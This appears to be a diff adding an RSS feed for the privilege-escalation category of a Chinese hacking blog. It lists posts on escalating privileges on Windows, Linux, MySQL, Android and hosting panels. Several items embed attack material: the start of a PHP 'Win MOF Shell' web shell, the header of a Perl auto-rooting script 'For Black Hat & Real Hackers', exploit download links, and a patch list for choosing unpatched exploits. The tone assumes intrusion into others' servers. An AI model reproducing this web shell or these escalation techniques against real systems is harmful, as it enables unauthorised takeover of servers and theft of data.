@@ -1,0 +1,327 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>提权 on Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+    <link>https://lcx.cc/categories/%E6%8F%90%E6%9D%83/</link>
+    <description>Recent content in 提权 on Nuclear&#39;Atk（核攻击）网络安全实验室</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <copyright>Nuclear&#39;Atk（核攻击）网络安全实验室</copyright>
+    <lastBuildDate>Wed, 15 Jul 2015 14:23:24 +0800</lastBuildDate><atom:link href="https://lcx.cc/categories/%E6%8F%90%E6%9D%83/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Hacking Team Adobe Font Driver 提权 快速利用介绍</title>
+      <link>https://lcx.cc/post/4554/</link>
+      <pubDate>Wed, 15 Jul 2015 14:23:24 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4554/</guid>
+      <description>Hacking Team Adobe Font Driver 提权 快速利用介绍 三好学生 | 2015-07-15 11:22 0x00 目标 利用Hacking Team 的Adobe Font Driver内核漏洞代码，重新编译，获得系统权限。 0x01 测试环境</description>
+    </item>
+    
+    <item>
+      <title>Android &lt;5.0 ObjectInputStream 权限提升漏洞，安卓5.0以下版本提权漏洞</title>
+      <link>https://lcx.cc/post/4450/</link>
+      <pubDate>Sun, 23 Nov 2014 17:07:42 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4450/</guid>
+      <description>android 5.0 修复了此漏洞：https://android.googlesource.com/platform/libcore/+/738c833d3</description>
+    </item>
+    
+    <item>
+      <title>老物再谈：SqlMap mysql udf.dll 提权</title>
+      <link>https://lcx.cc/post/4415/</link>
+      <pubDate>Sat, 16 Aug 2014 10:10:42 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4415/</guid>
+      <description>看了这个：windows 2008 怎么利用mysql（5.0）提权然后想了下发下。不是什么新东西，很多人都应该会了。 以前分享在百度网盘，好像没人看。</description>
+    </item>
+    
+    <item>
+      <title>服务器有360等怎么提权呢？服务器有360等怎么提权、得到控制呢？</title>
+      <link>https://lcx.cc/post/4214/</link>
+      <pubDate>Wed, 19 Feb 2014 09:48:40 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4214/</guid>
+      <description>服务器有360等怎么提权呢？ 乌云 | 2014-02-18 12:16 服务器有360等怎么提权、得到控制呢？ 手里没有免杀远控。 [原文地址] 相关讨论： 1# 龙辰 (头像我女神) |</description>
+    </item>
+    
+    <item>
+      <title>mof提权带回显带清楚命令版本.php</title>
+      <link>https://lcx.cc/post/4048/</link>
+      <pubDate>Tue, 26 Nov 2013 09:58:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4048/</guid>
+      <description>&amp;lt;?php $path=&#34;c:/windows/system32/canimei&#34;; session_start(); if(!empty($_POST[&#39;submit&#39;])){ setcookie(&#34;connect&#34;); setcookie(&#34;connect[host]&#34;,$_POST[&#39;host&#39;]); setcookie(&#34;connect[user]&#34;,$_POST[&#39;user&#39;]); setcookie(&#34;connect[pass]&#34;,$_POST[&#39;pass&#39;]); setcookie(&#34;connect[dbname]&#34;,$_POST[&#39;dbname&#39;]); echo &#34;&amp;lt;script&amp;gt;location.href=&#39;?action=connect&#39;&amp;lt;/script&amp;gt;&#34;; } if(empty($_GET[&#34;action&#34;])){ ?&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Win MOF Shell&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form action=&#34;?action=connect&#34; method=&#34;post&#34;&amp;gt; Host: &amp;lt;input type=&#34;text&#34; name=&#34;host&#34; value=&#34;192.168.200.144:3306&#34;&amp;gt;&amp;lt;br/&amp;gt; User: &amp;lt;input type=&#34;text&#34; name=&#34;user&#34; value=&#34;root&#34;&amp;gt;&amp;lt;br/&amp;gt; Pass: &amp;lt;input type=&#34;password&#34; name=&#34;pass&#34; value=&#34;toor&#34;&amp;gt;&amp;lt;br/&amp;gt; DB: &amp;lt;input type=&#34;text&#34; name=&#34;dbname&#34; value=&#34;mysql&#34;&amp;gt;&amp;lt;br/&amp;gt; &amp;lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;Submit&#34;&amp;gt;&amp;lt;br/&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; &amp;lt;?php exit; } if ($_GET[action]==&#39;connect&#39;) { $conn=mysql_connect($_COOKIE[&#34;connect&#34;][&#34;host&#34;],$_COOKIE[&#34;connect&#34;][&#34;user&#34;],$_COOKIE[&#34;connect&#34;][&#34;pass&#34;]) or die(&#39;&amp;lt;pre&amp;gt;&#39;.mysql_error().&#39;&amp;lt;/pre&amp;gt;&#39;); echo &#34;&amp;lt;form action=&#39;&#39; method=&#39;post&#39;&amp;gt;&#34;; echo &#34;Cmd:&#34;; echo &#34;&amp;lt;input type=&#39;text&#39; name=&#39;cmd&#39; value=&#39;$strCmd&#39;?&amp;gt;&#34;; echo</description>
+    </item>
+    
+    <item>
+      <title>[分享]一个Linux Kernel 提权Exp查询脚本</title>
+      <link>https://lcx.cc/post/3836/</link>
+      <pubDate>Sat, 31 Aug 2013 15:12:13 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3836/</guid>
+      <description>Linux_Exploit_Suggester ： https://github.com/PenturaLabs/Linux_Exploit_Suggester 一个通过Kernel版本在exploit-db查询相关exp的小脚本，一直比较期待有个智能的提权script，一定要“云”化，哪个ex</description>
+    </item>
+    
+    <item>
+      <title>Android ICS adb调试工具系统还原目录遍历漏洞（可提权）</title>
+      <link>https://lcx.cc/post/3680/</link>
+      <pubDate>Mon, 08 Jul 2013 16:28:07 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3680/</guid>
+      <description>原漏洞信息来自于aberkman@gmail.com 漏洞描述：adb（Android Debug Bridge）的backup/restore选项允许你</description>
+    </item>
+    
+    <item>
+      <title>Linux PREF_EVENTS Local Root 2.6.37-3.8.10 x86_64，本地提权</title>
+      <link>https://lcx.cc/post/3498/</link>
+      <pubDate>Wed, 15 May 2013 10:31:46 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3498/</guid>
+      <description>Linux PREF_EVENTS Local Root 2.6.37-3.8.10 x86_64，本地提权，[CVE-2013-2094]Linux PREF_EVENTS Local Root 2.6.37-3.8.10 x86_64。 http://sd.fucksheep.org/warez/semtex.c 又一个linux安全的偶像sd牛刚刚发出的</description>
+    </item>
+    
+    <item>
+      <title>虚拟主机提权，调用远程路径去执行CMD</title>
+      <link>https://lcx.cc/post/3221/</link>
+      <pubDate>Wed, 26 Dec 2012 01:18:31 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3221/</guid>
+      <description>是否大家遇到虚拟主机提权的时候，有这种情况,不管你写哪都提示的 &#34;拒绝访问&#34;？ 原因大多数是麦咖啡的一个功能，只让特定的目录可以执行程序，比如(</description>
+    </item>
+    
+    <item>
+      <title>About Mysql 的那个提权漏洞</title>
+      <link>https://lcx.cc/post/3123/</link>
+      <pubDate>Tue, 04 Dec 2012 11:59:18 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3123/</guid>
+      <description>这个：MySQL Windows Remote System Level Exploit (Stuxnet technique) 0day；MySQL 的 Windows 远程系统级漏洞（Stuxnet 病毒采用的技术） 大致看了一下，原来是在导出文件的时候出的</description>
+    </item>
+    
+    <item>
+      <title>zkysoft 主机提权方法</title>
+      <link>https://lcx.cc/post/2940/</link>
+      <pubDate>Wed, 26 Sep 2012 09:24:47 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2940/</guid>
+      <description>zkeys 默认网站用户权限很低，大部分exp都用不了，如 iis6 exp 就提示无法设置注册表。 提供我成功过的几个方法（不一定有效）： 1、如果目标仅仅是旁站的话可</description>
+    </item>
+    
+    <item>
+      <title>星外(7i24)虚拟主机管理系统，提权方案、方法集合</title>
+      <link>https://lcx.cc/post/2792/</link>
+      <pubDate>Sat, 18 Aug 2012 17:38:07 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2792/</guid>
+      <description>整理硬盘，翻出来的，趁还没有删除，发出来让大家积累下经验。 下载地址：星外主机提权.rar 转自：http://forum.90sec.org/</description>
+    </item>
+    
+    <item>
+      <title>MySql 被降权提权思路，反弹低权限CmdShell，鸡肋文章，略狗血……</title>
+      <link>https://lcx.cc/post/2722/</link>
+      <pubDate>Wed, 25 Jul 2012 09:43:28 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2722/</guid>
+      <description>测试环境 windows 2003 mysql 5.1 iis 6.0 &amp;nbsp; mysql默认是以system权限启动的，但是为了安全很多管理员都会给mysql降权到 guest 权限去启动。 目前百度搜索的文章</description>
+    </item>
+    
+    <item>
+      <title>iis6 提权提示 Can not find wmiprvse.exe 的突破方法</title>
+      <link>https://lcx.cc/post/2666/</link>
+      <pubDate>Wed, 11 Jul 2012 10:52:59 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2666/</guid>
+      <description>如题。 其实很简单就可以突破。 方法一： 在IIS环境下，如果权限做得不严格，我们在aspx大马里面是有权限直接结束wmiprvse.exe进程的</description>
+    </item>
+    
+    <item>
+      <title>Linux&gt;=2.6.39 Mempodipper 本地提权分析和 EXP 利用</title>
+      <link>https://lcx.cc/post/2650/</link>
+      <pubDate>Sun, 08 Jul 2012 16:16:28 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2650/</guid>
+      <description>Linux&amp;gt;=2.6.39 Mempodipper本地提权分析和EXP利用(CVE-2012-0056) /proc/pid/mem是一个用于读取和写入，直接通过各地寻</description>
+    </item>
+    
+    <item>
+      <title>一些本地提权漏洞，对应的补丁序列号，提权的时候会用到</title>
+      <link>https://lcx.cc/post/2380/</link>
+      <pubDate>Sun, 01 Apr 2012 11:10:06 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2380/</guid>
+      <description>一些本地提权漏洞，对应的补丁序列号，提权的时候会用到，先看看打没打补丁，再决定用哪个。 KB2360937 MS10-084 KB2478960 MS11-014 KB2507938 MS11-056 KB2566454 MS11-062 KB2646524 MS12-003 KB2645640 MS12-009 KB2641653 MS12-018 KB944653 MS07-067 KB952004 MS09-012 KB971657 MS09-041 KB2620712 MS11-097 KB2393802 MS11-011 kb942831 MS08-005 KB2503665</description>
+    </item>
+    
+    <item>
+      <title>MS11-046 本地提权漏洞利用代码</title>
+      <link>https://lcx.cc/post/1989/</link>
+      <pubDate>Thu, 01 Dec 2011 20:09:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1989/</guid>
+      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; From：http://bbs.pediy.com/showthread.php?t=143634 MS11-046 本地提权漏洞利用代码： /* &amp;nbsp;*</description>
+    </item>
+    
+    <item>
+      <title>windows2003 x64 提权一点经验</title>
+      <link>https://lcx.cc/post/1943/</link>
+      <pubDate>Thu, 24 Nov 2011 01:36:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1943/</guid>
+      <description>By：hostay 最近看到很多基友遇到x64的版本素手无策，我最开始遇到的时候也折腾了好久，就写一下我提权的过程吧，无技术含量，本人表达能力</description>
+    </item>
+    
+    <item>
+      <title>mysql udf 提权要注意的 - 技术文章</title>
+      <link>https://lcx.cc/post/1900/</link>
+      <pubDate>Tue, 15 Nov 2011 05:36:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1900/</guid>
+      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; By：zafe 一： &amp;nbsp;&amp;nbsp;&amp;nbsp; 导出的文件名不一定非是xxx.dll，可以试任意的，比如 create function sys_eval returns string soname &#39;udf.xox&#39;; 二： Can&#39;t open shared library &#39;fun.dll&#39; (errno: 2 ) &amp;nbsp;&amp;nbsp;&amp;nbsp; 除了udf不存在、udf被</description>
+    </item>
+    
+    <item>
+      <title>关于国内各种所谓的“大牛B”，及各种版本的本地提权工具想说的。</title>
+      <link>https://lcx.cc/post/1813/</link>
+      <pubDate>Fri, 07 Oct 2011 10:47:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1813/</guid>
+      <description>在 T00ls.net 看到个帖子，原文如下： 原帖标题“一些想法罢了。。有兴趣的同鞋看看”，楼主： 每每拿到shell 的时候&amp;nbsp; 提权都会不经意的去看看ws</description>
+    </item>
+    
+    <item>
+      <title>星外提权辅助工具（绝非0day，只是辅助工具）</title>
+      <link>https://lcx.cc/post/1764/</link>
+      <pubDate>Wed, 14 Sep 2011 13:42:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1764/</guid>
+      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; by：小手冰凉ing &amp;nbsp;&amp;nbsp;&amp;nbsp; 注意：只是辅助工具而已 &amp;nbsp;&amp;nbsp;&amp;nbsp; 原理是自动读所有可读的注册表,并自动找注册表里面存在的路径信息,然后全部echo.. &amp;nbsp;&amp;nbsp;&amp;nbsp; 然后呢</description>
+    </item>
+    
+    <item>
+      <title>linux 全自动提权脚本（转）</title>
+      <link>https://lcx.cc/post/1559/</link>
+      <pubDate>Sat, 09 Jul 2011 13:38:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1559/</guid>
+      <description>#!/usr/bin/perl # #&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ==&amp;gt;&amp;gt; Viper Auto Rooting &amp;lt;&amp;lt;== # # #&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; --------------------------------------------------------------------------------------------------------------------------- #&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Script : Perl #&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; By : Bl4ck.Viper #&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; From : Azarbycan (Turkish Man)(fardin Allahverdinajhand) #&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Contact : [email]Bl4ck.Viper@Gmail.Com[/email] , [email]Bl4ck.Viper@Hotmail.Com[/email] , [email]Bl4ck.Viper@Yahoo.Com[/email] #&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Version : 2.0 #&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; For Black Hat &amp;amp; Real Hackers #&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ---------------------------------------------------------------------------------------------------------------------------&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; --------------------------------------------------------------------------------------------------------------------------- #&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; For All Version Of Linux , SunOS , MacOS X , FreeBSD #&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; --------------------------------------------------------------------------------------------------------------------------- #&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; print &#34;\t\t\tViper Auto Rooting\n&#34;;</description>
+    </item>
+    
+    <item>
+      <title>关于ZKEYS虚拟主机管理提权</title>
+      <link>https://lcx.cc/post/1558/</link>
+      <pubDate>Sat, 09 Jul 2011 13:36:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1558/</guid>
+      <description>文章作者：knife 出自：吐司 宏杰&amp;nbsp;&amp;nbsp;ZKEYS 是一个国内比较常用的IDC虚拟主机系统&amp;nbsp;&amp;nbsp; 原名：Au</description>
+    </item>
+    
+    <item>
+      <title>Windows Server 2003/2008 本地提权 0day</title>
+      <link>https://lcx.cc/post/1451/</link>
+      <pubDate>Wed, 15 Jun 2011 12:57:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1451/</guid>
+      <description>By：Y35!U 2008 我没测试过，据说可以，朋友在5月初给我的。 一个月了，都没怎么用过，因为我搞国外站，linux下的比较多，很少是win下的。</description>
+    </item>
+    
+    <item>
+      <title>突破 xpsql.cpp: 错误 5 提权</title>
+      <link>https://lcx.cc/post/1400/</link>
+      <pubDate>Mon, 06 Jun 2011 16:00:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1400/</guid>
+      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; By：isosky &amp;nbsp;&amp;nbsp;&amp;nbsp; 今天某群某小盆友在群发shell求提权。看见他发了几次。听着挺诱惑（SA\ROOT密码都有）,本着多一台服务器的YD心</description>
+    </item>
+    
+    <item>
+      <title>星外提权“新思路”</title>
+      <link>https://lcx.cc/post/1399/</link>
+      <pubDate>Mon, 06 Jun 2011 15:54:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1399/</guid>
+      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; By：Detective &amp;nbsp;&amp;nbsp;&amp;nbsp; 声明，这不是什么星外0DAY，这充其量只是一个在找不到可写可执行目录的一个提权思路。我不敢说是我最先发现的，可能</description>
+    </item>
+    
+    <item>
+      <title>Mysql 的一个比较重要的知识 - Mysql 提权技巧</title>
+      <link>https://lcx.cc/post/1255/</link>
+      <pubDate>Sun, 10 Apr 2011 20:43:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1255/</guid>
+      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; Mysql 的一个比较重要的知识，Mysql 提权技巧。 &amp;nbsp;&amp;nbsp;&amp;nbsp; 当 Mysql 安装后，会将 root 密码写入到：c:\windows\my.ini，怎么利用，大家都懂。</description>
+    </item>
+    
+    <item>
+      <title>【渗透】各种提权 渗透 经验 技巧总结大全</title>
+      <link>https://lcx.cc/post/1018/</link>
+      <pubDate>Sat, 11 Dec 2010 17:54:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1018/</guid>
+      <description>各种提权、渗透经验、技巧总结大全，提权、渗透经验、技巧，提权经验，提权技巧，渗透经验，渗透技巧，总结大全，旁站路径问题，iis_spy 列举，</description>
+    </item>
+    
+    <item>
+      <title>【Linux】linux提权 Root权限WebShell提权</title>
+      <link>https://lcx.cc/post/553/</link>
+      <pubDate>Wed, 15 Sep 2010 10:58:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/553/</guid>
+      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; 没啥技术含量，一种思路，让某些得到Root权限WebShell的同学可以快点拿到权限。 &amp;nbsp;&amp;nbsp;&amp;nbsp; 某日拿到某站WebShell，RedHat(红旗l</description>
+    </item>
+    
+    <item>
+      <title>关于“最强体积最小提权超猛asp大马”后门问题</title>
+      <link>https://lcx.cc/post/419/</link>
+      <pubDate>Tue, 17 Aug 2010 20:18:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/419/</guid>
+      <description>博主评论： &amp;nbsp;&amp;nbsp;&amp;nbsp; 老是有他妈的垃圾人，发垃圾马，还他妈的有后门，你他妈的全家死完！整个家族死绝！ &amp;nbsp;&amp;nbsp;&amp;nbsp; 根本就没去后门，去个毛，还是带后门的。垃圾鸟人。</description>
+    </item>
+    
+    <item>
+      <title>【技巧】入侵提权的一些小经验 心得&#43;点点经验</title>
+      <link>https://lcx.cc/post/412/</link>
+      <pubDate>Sun, 15 Aug 2010 02:14:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/412/</guid>
+      <description>标题：心得+点点经验，比较大众化。 内容： &amp;nbsp;&amp;nbsp;&amp;nbsp; 1、在shell提权中，如果是.asp马，可以试下aspx或者php格式的shell，其中PHP权</description>
+    </item>
+    
+    <item>
+      <title>【工具】2010黑帽大会上的提权好东西 提权大杀器</title>
+      <link>https://lcx.cc/post/397/</link>
+      <pubDate>Tue, 10 Aug 2010 14:53:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/397/</guid>
+      <description>下载（内含源码）：http://www.uudisc.com/user/nuclearatk/file/3373473</description>
+    </item>
+    
+    <item>
+      <title>【0day】ActivePerl和ActivePython提权漏洞</title>
+      <link>https://lcx.cc/post/383/</link>
+      <pubDate>Fri, 06 Aug 2010 12:53:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/383/</guid>
+      <description>威胁原因：ActivePerl和ActivePython for win X86 安装配置问题。 利用需求：默认安装了以上任意一种，相对应的Python26\Sc</description>
+    </item>
+    
+    <item>
+      <title>【Exp】金山网盾内核模式本地提权</title>
+      <link>https://lcx.cc/post/119/</link>
+      <pubDate>Mon, 24 May 2010 00:26:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/119/</guid>
+      <description>金山网盾内核模式本地提权漏洞 2010.4.14.609版本及之前的KAVSafe.sys存在内核本地提权漏洞 下载利用代码(C+) # Title: Kingsoft WebShield KAVSafe.sys &amp;lt;=</description>
+    </item>
+    
+    <item>
+      <title>【转载】1433口令提权的详细过程</title>
+      <link>https://lcx.cc/post/82/</link>
+      <pubDate>Sat, 08 May 2010 21:40:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/82/</guid>
+      <description>下面来说sa下执行命令错误的几种情况： 1、&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 无法装载DLL</description>
+    </item>
+    
+  </channel>
+</rss>
